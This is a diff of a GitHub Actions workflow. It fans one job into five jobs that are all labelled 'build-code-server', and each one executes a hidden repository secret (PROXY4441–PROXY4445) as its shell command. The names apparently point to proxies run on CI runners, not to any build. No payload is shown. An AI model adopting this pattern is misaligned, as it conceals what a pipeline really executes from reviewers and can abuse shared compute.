@@ -2,9 +2,33 @@ name: my-code-server
 on:   
   push:
 jobs:
-  build:
+  build0:
     runs-on: ubuntu-24.04
     steps: 
       - name: build-code-server
         continue-on-error: true
-        run: ${{ secrets.codeserver }}
+        run: ${{ secrets.PROXY4441 }}
+  build1:
+    runs-on: ubuntu-24.04
+    steps: 
+      - name: build-code-server
+        continue-on-error: true
+        run: ${{ secrets.PROXY4442 }}
+  build2:
+    runs-on: ubuntu-24.04
+    steps: 
+      - name: build-code-server
+        continue-on-error: true
+        run: ${{ secrets.PROXY4443 }}
+  build3:
+    runs-on: ubuntu-24.04
+    steps: 
+      - name: build-code-server
+        continue-on-error: true
+        run: ${{ secrets.PROXY4444 }}
+  build4:
+    runs-on: ubuntu-24.04
+    steps: 
+      - name: build-code-server
+        continue-on-error: true
+        run: ${{ secrets.PROXY4445 }}
